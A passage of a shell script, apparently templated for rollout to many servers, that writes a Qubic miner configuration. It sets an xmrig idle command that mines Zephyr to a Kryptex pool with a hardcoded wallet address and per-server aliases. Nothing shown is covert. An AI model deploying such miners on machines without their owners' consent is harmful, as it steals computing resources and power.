...
mkdir -p /q2
cp /q/* /q2
echo '{{"Settings": {{"amountOfThreads": ${cpu}, "allowHwInfoCollect": true, "baseUrl": "https://mine.qubic.li/", "payoutId": "QCEACBTGCPPHEARVNKEZAVOXURADPKOQUBNWCWCJKCWJOANIBAHHROQGNFRE", "alias": "r_${cpu}_${server_id}", "idleSettings": {{"command": "/z/xmrig-6.21.3/xmrig","arguments":"-o zeph.kryptex.network:7777 -u ZEPHs89ZXrJYSiu4Sw2xLdGFveJ1RWi5tPBVewY1XvoYNFrpXPLQsVEJzUvpKX3R5kcWziMi7wNT2bMdyiKEkZYfGn2qrmTgTJY/r_${cpu}_${server_id} -a rx/0 -k --coin zephyr"}}}}}}' > /q2/appsettings.json
